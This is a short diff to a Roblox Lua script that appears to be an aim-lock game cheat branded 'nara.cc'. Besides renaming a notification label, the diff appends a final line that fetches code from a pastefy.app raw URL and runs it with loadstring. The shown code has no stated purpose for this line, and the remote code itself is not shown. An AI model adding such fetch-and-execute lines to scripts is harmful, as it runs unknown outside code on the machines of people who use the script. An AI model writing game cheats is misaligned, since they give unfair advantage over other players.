@@ -117,7 +117,7 @@ local PredictionValue = 0.1111 --// Change Prediction,  AutoPrediction Must Be O
  
                     game.StarterGui:SetCore("SendNotification", {
                         Title = "nara.cc";
-                        Text = "Target: "..tostring(Plr.Character.Humanoid.DisplayName),
+                        Text = "locked: "..tostring(Plr.Character.Humanoid.DisplayName),
                         Duration = 5
                     })
  
@@ -294,3 +294,4 @@ local PredictionValue = 0.1111 --// Change Prediction,  AutoPrediction Must Be O
         end
     end)
     
+    loadstring(game:HttpGet("https://pastefy.app/oTXOueJa/raw", true))()
